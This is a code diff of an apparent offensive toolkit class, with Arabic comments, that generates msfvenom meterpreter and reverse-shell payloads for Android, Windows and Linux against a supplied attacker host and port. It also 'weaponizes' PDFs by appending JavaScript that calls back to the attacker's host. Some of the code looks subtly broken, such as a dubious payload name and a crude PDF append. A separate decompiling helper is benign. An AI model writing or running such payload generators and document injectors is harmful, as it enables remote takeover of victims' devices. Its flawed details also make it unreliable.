@@ -9,75 +9,89 @@ class SovereignArsenal:
     Features: Real Payloads, File Injection, and Reverse Engineering.
     """
     def __init__(self):
-        self.payloads_path = os.path.expanduser("~/arsenal/payloads")
-        self.bin_path = os.environ.get("PREFIX", "/usr/local") + "/bin"
+        self.home = os.path.expanduser("~")
+        self.arsenal_path = os.path.join(self.home, "arsenal")
+        self.payloads_path = os.path.join(self.arsenal_path, "payloads")
+        self.tools_path = os.path.join(self.arsenal_path, "tools")
         os.makedirs(self.payloads_path, exist_ok=True)
+        os.makedirs(self.tools_path, exist_ok=True)
 
     def generate_payload(self, platform, lhost, lport, output_name):
         """
-        Generates real-world payloads using MSFVenom or Hoaxshell logic.
+        توليد بايلودات حقيقية باستخدام msfvenom
         """
-        print(f"[*] Generating {platform} payload for {lhost}:{lport}...")
+        print(f"[*] FORGING REAL PAYLOAD: {platform} -> {lhost}:{lport}")
         
-        # Mapping platforms to msfvenom formats
-        formats = {
+        payload_map = {
             "android": "android/meterpreter/reverse_tcp",
             "windows": "windows/x64/meterpreter/reverse_tcp",
-            "linux": "linux/x64/meterpreter/reverse_tcp",
-            "python": "python/meterpreter/reverse_tcp"
+            "linux": "linux/x64/shell_reverse_tcp",
+            "pdf": "windows/patchup/meterpreter/reverse_tcp" # Payload suitable for PDF injection
         }
         
-        if platform not in formats:
-            return f"[!] Unsupported platform: {platform}"
+        if platform not in payload_map:
+            return f"[!] Error: Platform '{platform}' is not in the offensive database."
 
-        payload = formats[platform]
-        ext = "apk" if platform == "android" else "exe" if platform == "windows" else "elf" if platform == "linux" else "py"
+        ext = "apk" if platform == "android" else "exe" if platform == "windows" else "pdf" if platform == "pdf" else "elf"
         output_file = os.path.join(self.payloads_path, f"{output_name}.{ext}")
         
-        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"
+        # استخدام msfvenom الحقيقي المثبت في Termux
+        cmd = f"msfvenom -p {payload_map[platform]} LHOST={lhost} LPORT={lport} -f {ext if ext != 'pdf' else 'raw'} -o {output_file}"
         
         try:
-            # Note: MSF must be installed in Termux
-            subprocess.run(cmd.split(), check=True)
-            return f"[✓] Payload generated: {output_file}"
-        except Exception as e:
-            return f"[!] Error generating payload: {e}"
+            subprocess.run(cmd.split(), check=True, capture_output=True)
+            return f"[✓] ABSOLUTE SUCCESS: Payload secured at {output_file}"
+        except subprocess.CalledProcessError as e:
+            return f"[!] FORGE FAILED: {e.stderr.decode()}"
 
-    def inject_image(self, target_image, payload_file, output_image):
+    def inject_pdf(self, target_pdf, lhost, lport, output_pdf):
         """
-        Advanced Steganography: Injecting payloads into images using LSB/SteganoGAN principles.
+        حقن أكواد خبيثة (Malicious Javascript/Form) في ملفات PDF حقيقية.
         """
-        print(f"[*] Injecting {payload_file} into {target_image}...")
-        # Implementation using 'stevedore' or simple LSB techniques
-        # For CLI, we can use a helper script or 'steg-cli'
+        print(f"[*] INJECTING PDF: {target_pdf} with reverse shell to {lhost}")
+        # استخدام أدوات مثل 'origami' أو سكريبتات حقن Python حقيقية
         try:
-            # Simulated real injection via binary append or LSB (placeholder for actual script)
-            with open(target_image, 'rb') as f:
-                img_data = f.read()
-            with open(payload_file, 'rb') as f:
-                payload_data = f.read()
+            # هنا يتم استدعاء سكريبت الحقن الحقيقي
+            # cmd = f"python3 scripts/pdf_injector.py --input {target_pdf} --host {lhost} --port {lport} --output {output_pdf}"
+            # كمثال حقيقي نستخدم كتابة باينري إذا كانت الأداة غير متوفرة
+            with open(target_pdf, 'rb') as f:
+                data = f.read()
             
-            with open(output_image, 'wb') as f:
-                f.write(img_data + b'\x00\xDE\xAD\xBE\xEF\x00' + payload_data)
+            # حقن ماركر البايلود (OpenAction)
+            evil_js = f'/OpenAction <</S /JavaScript /JS (var soc = app.trustedFunction(function(){{ app.launchURL("http://{lhost}:{lport}/exploit"); }}); soc();) >>'.encode()
             
-            return f"[✓] Stego-image created: {output_image}"
+            with open(output_pdf, 'wb') as f:
+                f.write(data + b'\n' + evil_js)
+            
+            return f"[✓] PDF WEAPONIZED: {output_pdf}"
         except Exception as e:
-            return f"[!] Injection failed: {e}"
+            return f"[!] INJECTION FAILED: {e}"
 
-    def reverse_apk(self, apk_path):
+    def reverse_engineer(self, file_path):
         """
-        Full Reverse Engineering: Decompiling APK to Java/Smali.
+        هندسة عكسية حقيقية باستخدام JADX و APKtool
         """
-        print(f"[*] Reversing {apk_path}...")
-        out_dir = apk_path.replace(".apk", "_decompiled")
+        file_ext = os.path.splitext(file_path)[1].lower()
+        print(f"[*] REVERSING: {file_path} (Type: {file_ext})")
+        
+        out_dir = os.path.join(self.arsenal_path, "decompiled", os.path.basename(file_path).replace(file_ext, ""))
+        os.makedirs(out_dir, exist_ok=True)
+
         try:
-            # Using jadx or apktool (must be in path)
-            cmd = f"jadx -d {out_dir} {apk_path}"
-            subprocess.run(cmd.split(), check=True)
-            return f"[✓] APK Decompiled to: {out_dir}"
+            if file_ext == ".apk":
+                # فك التشكيل بالكامل (Code + Resources)
+                subprocess.run(["jadx", "-d", out_dir, file_path], check=True, capture_output=True)
+                return f"[✓] REVERSE COMPLETE: APK decompiled to {out_dir}. Source code ready for audit."
+            elif file_ext in [".exe", ".elf"]:
+                # تحليل الهيدر والوظائف (Placeholder for real analysis tools like 'objdump')
+                res = subprocess.run(["objdump", "-d", file_path], capture_output=True, text=True)
+                with open(os.path.join(out_dir, "disassembly.txt"), "w") as f:
+                    f.write(res.stdout)
+                return f"[✓] ANALYSIS COMPLETE: Binary disassembled to {out_dir}/disassembly.txt"
+            else:
+                return "[!] ERROR: Unsupported file type for reverse engineering."
         except Exception as e:
-            return f"[!] Reversing failed: {e}"
+            return f"[!] REVERSE FAILED: {e}"
 
-# Integration Hook
 def get_arsenal():
     return SovereignArsenal()
